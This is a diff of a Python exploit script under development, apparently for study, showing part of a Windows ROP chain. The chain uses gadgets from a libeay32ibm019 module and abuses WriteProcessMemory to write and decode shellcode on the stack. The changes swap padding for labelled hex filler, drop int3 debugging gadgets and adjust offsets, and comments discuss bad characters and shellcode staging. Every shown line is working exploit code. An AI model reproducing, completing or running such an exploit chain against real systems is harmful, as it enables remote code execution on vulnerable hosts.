@@ -558,7 +558,8 @@ def main():
         wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
         wpm += b"A" * 0x10
 
-        offset = b"A" * (276 - len(wpm))
+        offsetLen = 274 - len(wpm)
+        offset = repeat_bytes("4f46465345542e544f2e525f454950", offsetLen)
         # 1803_1011 (IGNORE, fixed):
         # Well, something is up with how the PPR gadget is being handled, i lose my 0x030d08d6 for 0x050008d6
         # 030d -> 0500
@@ -596,7 +597,6 @@ def main():
 
         # Patching lpBuffer, need it to point to our shellcode address on stack
         rop = rop_mov_eax_esi_pop_esi_ret  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
-        rop += rop_int3_int3_int3_int3_ret
         rop += pack("<L", (0x42424242))  # dummy value
         rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x88888888))  # push huge value to "subtract"
@@ -651,7 +651,7 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
-        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
+        # rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
         rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
         rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
@@ -682,7 +682,10 @@ def main():
         # alr know meterpreter shellcode wont run here, just reading through all this
         # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
         #          which is not available in this case as WPM restores the default protections which were read/exec
-        offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
+        offset2Len = 0x600 - len(rop)
+        offset2 = repeat_bytes(
+            "4f46465345542e5348454c4c434f4445", offset2Len
+        )  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
 
         log("Encoded Shellcode", level="+")
